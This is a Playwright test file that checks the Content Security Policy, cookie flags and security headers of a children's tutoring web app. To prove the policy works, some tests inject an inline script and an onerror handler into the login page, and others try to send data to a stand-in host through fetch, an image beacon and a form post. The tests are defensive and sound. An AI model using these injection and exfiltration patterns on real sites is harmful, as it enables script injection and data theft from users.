import { expect, test, type Page } from "@playwright/test";
import { buttons, readyForQuestion } from "./lesson-support";
import {
  addLearner,
  signInLearner,
  signUpAdmin,
  signUpParent,
  skipUnlessConfigured,
  unique,
} from "./support";

skipUnlessConfigured();

/**
 * The Content Security Policy is enforced by the browser, so a browser is where it is tested. Every
 * screen a person can reach has to load, hydrate and work without the policy refusing anything of
 * ours (a refusal is a silent failure: a button that does nothing), and the policy has to refuse
 * what is not ours.
 */

const REFUSED = "__refusedByPolicy";
const PUBLIC_PAGES = ["/", "/login", "/login?who=learner", "/signup", "/privacy"];

/**
 * Record, from before the page's own scripts run, every refusal the browser reports; also keep the
 * page's uncaught errors and any message about the policy or about hydration.
 */
async function watch(page: Page) {
  await page.addInitScript((name) => {
    const refused: string[] = [];
    (window as unknown as Record<string, unknown>)[name] = refused;
    document.addEventListener("securitypolicyviolation", (event) => {
      refused.push(`${event.violatedDirective} ${event.blockedURI || "inline"}`.trim());
    });
  }, REFUSED);
  const errors: string[] = [];
  page.on("pageerror", (error) => errors.push(`error: ${error.message}`.slice(0, 300)));
  page.on("console", (message) => {
    if (
      message.type() === "error" &&
      /Content Security Policy|Refused to|hydrat/i.test(message.text())
    )
      errors.push(`console: ${message.text()}`.slice(0, 300));
  });
  return {
    /** Nothing refused and nothing broken on the page the browser is on (call before leaving it). */
    async clean(where: string) {
      await page.waitForLoadState("networkidle");
      const refused = await page.evaluate(
        (name) => (window as unknown as Record<string, string[]>)[name] ?? [],
        REFUSED,
      );
      expect(refused, `${where}: the policy refused something`).toEqual([]);
      expect(errors, `${where}: the page reported errors`).toEqual([]);
    },
  };
}

const directive = (policy: string, name: string): string =>
  policy
    .split(";")
    .map((part) => part.trim())
    .find((part) => part === name || part.startsWith(`${name} `)) ?? "";

test.describe("content security policy", () => {
  test("a fresh nonce on every page, no unsafe script sources, and nothing of ours refused", async ({
    page,
  }) => {
    const seen = await watch(page);
    const nonces = new Set<string>();
    for (const path of PUBLIC_PAGES) {
      const response = await page.goto(path);
      expect(response?.status(), path).toBe(200);
      const headers = response!.headers();
      const policy = headers["content-security-policy"];
      expect(policy, `${path}: no policy`).toBeTruthy();

      const nonce = /'nonce-([^']+)'/.exec(directive(policy!, "script-src"))?.[1];
      expect(nonce, `${path}: no nonce`).toBeTruthy();
      nonces.add(nonce!);
      const scripts = directive(policy!, "script-src");
      expect(scripts).toContain("'strict-dynamic'");
      expect(scripts).not.toContain("'unsafe-inline'");
      expect(scripts).not.toContain("'unsafe-eval'");
      expect(directive(policy!, "default-src")).toBe("default-src 'self'");
      expect(directive(policy!, "connect-src")).toBe("connect-src 'self'");
      expect(directive(policy!, "frame-ancestors")).toBe("frame-ancestors 'none'");
      expect(directive(policy!, "object-src")).toBe("object-src 'none'");

      // the page's own scripts carry the nonce this response promised, and no other
      const used = await page.evaluate(() =>
        [...document.querySelectorAll("script")].map((script) => script.nonce),
      );
      expect(used.filter(Boolean).length, `${path}: no script with the nonce`).toBeGreaterThan(0);
      for (const found of used) if (found) expect(found).toBe(nonce);

      // headers that do not depend on the page
      expect(headers["x-content-type-options"]).toBe("nosniff");
      expect(headers["x-frame-options"]).toBe("DENY");
      expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
      expect(headers["permissions-policy"]).toContain("geolocation=()");
      expect(headers["permissions-policy"]).toContain("camera=()");
      expect(headers["permissions-policy"]).toContain("microphone=()");
      // a page that depends on who is signed in is never kept by a shared cache
      expect(headers["cache-control"]).toContain("no-store");

      await seen.clean(path);
    }
    // a new nonce for every page view, never a reused one
    expect(nonces.size).toBe(PUBLIC_PAGES.length);
  });

  test("a page that is not there is a plain, friendly 404 that gives nothing away", async ({
    page,
  }) => {
    const seen = await watch(page);
    const response = await page.goto("/no-such-page-at-all");
    expect(response?.status()).toBe(404);
    expect(response?.headers()["content-security-policy"]).toBeTruthy();
    await expect(page.getByRole("heading", { name: "We could not find that" })).toBeVisible();
    await expect(page.locator("body")).not.toContainText(/stack|exception|at \w+ \(|\.tsx?:\d+/i);
    await seen.clean("the 404 page");
    await page.getByRole("link", { name: "Go to the start" }).click();
    await expect(page).toHaveURL(/\/$/);
  });

  test("the sign-in cookie cannot be read by a script on the page", async ({ page }) => {
    await signUpParent(page, "Mrs Tembo", `cookie-${unique()}@example.test`);
    const cookies = (await page.context().cookies()).filter((cookie) =>
      cookie.name.startsWith("sb-"),
    );
    expect(cookies.length, "no session cookie was set").toBeGreaterThan(0);
    for (const cookie of cookies) {
      expect(cookie.httpOnly, `${cookie.name} is readable by scripts`).toBe(true);
      expect(cookie.sameSite, cookie.name).toBe("Lax");
    }
    // and so a script cannot see them either
    expect(await page.evaluate(() => document.cookie)).not.toContain("sb-");
  });

  test("the page is interactive: a link is followed without reloading the document", async ({
    page,
  }) => {
    const seen = await watch(page);
    await page.goto("/login?who=parent");
    // set on this document: it survives only if the router changes the page without loading a new one
    await page.evaluate(() => {
      (window as unknown as Record<string, unknown>).__sameDocument = true;
    });
    await page.getByRole("link", { name: "Create a parent account" }).click();
    await expect(page).toHaveURL(/\/signup/);
    const same = await page.evaluate(
      () => (window as unknown as Record<string, unknown>).__sameDocument === true,
    );
    expect(same, "the router did not take over: the scripts did not run").toBe(true);
    await seen.clean("/login to /signup");
  });

  test("a script or a handler that arrives in the page's own markup is not run", async ({
    page,
  }) => {
    await watch(page);
    // what a hole in the page's markup would let through: this is the markup, changed on its way
    await page.route(
      (url) => url.pathname === "/login",
      async (route) => {
        const response = await route.fetch();
        const body = (await response.text()).replace(
          "</body>",
          `<script>window.injectedScript = true</script>` +
            `<img src="/not-there.png" onerror="window.injectedHandler = true"></body>`,
        );
        const headers = Object.fromEntries(
          Object.entries(response.headers()).filter(
            ([name]) => !["content-length", "content-encoding", "transfer-encoding"].includes(name),
          ),
        );
        await route.fulfill({ status: response.status(), headers, body });
      },
    );
    const response = await page.goto("/login");
    expect(response?.headers()["content-security-policy"]).toBeTruthy();
    await page.waitForLoadState("networkidle");
    const result = await page.evaluate((name) => {
      const w = window as unknown as Record<string, unknown>;
      return {
        ran: { script: w.injectedScript === true, handler: w.injectedHandler === true },
        refused: (w[name] as string[]) ?? [],
        // the markup really was changed, so that the test above proves something
        inPage: document.querySelectorAll("img[onerror]").length,
      };
    }, REFUSED);
    expect(result.inPage).toBe(1);
    expect(result.ran).toEqual({ script: false, handler: false });
    const directives = result.refused.map((entry) => entry.split(" ")[0]);
    expect(directives).toContain("script-src-elem");
    expect(directives).toContain("script-src-attr");
  });

  test("a script that does run cannot send anything to another address", async ({ page }) => {
    await watch(page);
    await page.goto("/login");
    // the three ways a stolen answer or a stolen name would leave the page
    const result = await page.evaluate(async (name) => {
      let fetched = "reached";
      try {
        await fetch("https://example.org/collect", { mode: "no-cors" });
      } catch {
        fetched = "refused";
      }
      new Image().src = "https://example.org/collect.gif?x=1";
      const form = document.createElement("form");
      form.method = "post";
      form.action = "https://example.org/collect";
      document.body.append(form);
      form.requestSubmit();
      await new Promise((resolve) => setTimeout(resolve, 600));
      const w = window as unknown as Record<string, string[]>;
      return { fetched, refused: w[name] ?? [], here: location.pathname };
    }, REFUSED);
    expect(result.fetched).toBe("refused");
    expect(result.here).toBe("/login");
    const directives = result.refused.map((entry) => entry.split(" ")[0]);
    for (const expected of ["connect-src", "img-src", "form-action"])
      expect(directives, `no refusal under ${expected}: ${result.refused.join(" | ")}`).toContain(
        expected,
      );
  });

  test("every screen of a parent, a learner and an administrator works under the policy", async ({
    page,
    browser,
  }, testInfo) => {
    const id = unique();
    const username = `csp${id}`.slice(0, 24);

    // ── a parent ───────────────────────────────────────────────────────────────────────────
    const parent = await watch(page);
    await signUpParent(page, "Mrs Moyo", `csp-parent-${id}@example.test`);
    await parent.clean("after signing up");
    await addLearner(page, { name: "Anesu", username, grade: 7 });
    await parent.clean("parent home with a new learner");
    await page.getByRole("link", { name: "See progress" }).click();
    await expect(page).toHaveURL(/\/parent\/learners\//);
    await parent.clean("a child's progress, for the parent");
    await page.goto("/parent/learners/new");
    await parent.clean("adding a learner");

    // ── the learner ────────────────────────────────────────────────────────────────────────
    const context = await browser.newContext(testInfo.project.use);
    const learnerPage = await context.newPage();
    const learner = await watch(learnerPage);
    await signInLearner(learnerPage, username);
    await learner.clean("learner home");

    await learnerPage
      .getByRole("region", { name: /Start something new/i })
      .getByRole("link")
      .click();
    await expect(learnerPage).toHaveURL(/\/student\/learn\//);
    await learner.clean("a lesson, before it is started");
    await learnerPage.getByRole("button", { name: buttons.start }).click();
    await readyForQuestion(learnerPage);
    await learner.clean("a lesson, with its first question");
    await learnerPage.getByText("Ask ZimTutor a question").click();
    await learnerPage.getByRole("textbox", { name: /Type your question/ }).fill("why do we carry?");
    await learnerPage.getByRole("button", { name: "Send", exact: true }).click();
    await expect(learnerPage.getByRole("list", { name: "Your lesson so far" })).toContainText(
      "why do we carry?",
    );
    await learner.clean("a lesson, after a question of the child's own");

    await learnerPage.goto("/student/progress");
    await learner.clean("progress");
    await learnerPage.goto("/student/exams");
    await learner.clean("practice papers");
    await learnerPage
      .getByRole("button", { name: /Short paper: 20 multiple-choice questions/ })
      .click();
    await expect(learnerPage).toHaveURL(/\/student\/exams\/[0-9a-f-]{36}$/);
    await learner.clean("a practice paper");
    await context.close();

    // ── an administrator ───────────────────────────────────────────────────────────────────
    const adminContext = await browser.newContext(testInfo.project.use);
    const adminPage = await adminContext.newPage();
    const admin = await watch(adminPage);
    await signUpAdmin(adminPage, "csp-admin");
    await admin.clean("admin home");
    await adminPage.goto("/admin/curriculum");
    await admin.clean("curriculum");
    await adminPage
      .getByRole("region", { name: "Grade 5" })
      .getByRole("link", { name: /Number/ })
      .click();
    await admin.clean("a topic");
    await adminPage.goto("/admin/curriculum/objectives/G5-NUM-PROPER-FRACTIONS-004");
    await admin.clean("an objective");
    for (const path of [
      "/admin/supplemental",
      "/admin/questions",
      "/admin/safety",
      "/admin/audit",
    ]) {
      await adminPage.goto(path);
      await admin.clean(path);
    }
    await adminContext.close();
  });
});
